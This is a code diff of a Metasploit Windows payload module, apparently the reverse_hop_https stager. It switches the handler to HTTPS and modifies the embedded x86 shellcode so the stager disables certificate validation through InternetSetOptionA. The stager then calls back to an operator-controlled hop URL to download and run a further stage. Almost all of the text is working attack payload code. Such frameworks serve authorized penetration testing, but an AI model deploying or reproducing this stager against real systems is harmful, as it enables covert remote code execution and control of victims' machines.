@@ -5,7 +5,7 @@
 
 require 'uri'
 require 'msf/core'
-require 'msf/core/handler/reverse_hop_http'
+require 'msf/core/handler/reverse_hop_https'
 
 module Metasploit3
 
@@ -27,7 +27,7 @@ module Metasploit3
       'License'       => MSF_LICENSE,
       'Platform'      => 'win',
       'Arch'          => ARCH_X86,
-      'Handler'       => Msf::Handler::ReverseHopHttp,
+      'Handler'       => Msf::Handler::ReverseHopHttps,
       'Convention'    => 'sockedi http',
       'DefaultOptions' => { 'WfsDelay' => 30 },
       'Stager'        =>
@@ -59,7 +59,8 @@ module Metasploit3
   #
   def generate
     uri = URI(datastore['HOPURL'])
-    print uri.port
+    print "#{uri.port}"
+
     #create actual payload
     payload_data = <<EOS
   cld            ; clear direction flag
@@ -179,7 +180,7 @@ internetconnect:
   pop ebx                ; Save the hostname pointer
   xor ecx, ecx
   push ecx               ; DWORD_PTR dwContext (NULL)
-  push 0x08000000               ; dwFlags
+  push ecx               ; dwFlags
   push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
   push ecx               ; password
   push ecx               ; username
@@ -195,10 +196,11 @@ httpopenrequest:
   pop ecx
   xor edx, edx           ; NULL
   push edx               ; dwContext (NULL)
-  push (0x80000000 | 0x08000000 | 0x00001000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags
+  push (0x80000000 | 0x00800000 | 0x00001000 | 0x00002000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags
     ;0x80000000 |        ; INTERNET_FLAG_RELOAD
-    ;0x08000000 |        ; INTERNET_FLAG_SECURE
+    ;0x00800000 |        ; INTERNET_FLAG_SECURE
     ;0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+    ;0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
     ;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
     ;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
     ;0x00000200 |        ; INTERNET_FLAG_NO_UI
@@ -232,6 +234,21 @@ httpsendrequest:
 try_it_again:
   dec ebx
   jz failure
+
+set_security_options:
+  push 0x00003380
+    ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+    ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+    ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
+    ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
+    ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
+  mov eax, esp
+  push 0x04                 ; sizeof(dwFlags)
+  push eax               ; &dwFlags
+  push 0x1f              ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
+  push esi               ; hRequest
+  push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
+  call ebp
   jmp.i8 httpsendrequest
 
 dbl_get_server_host:
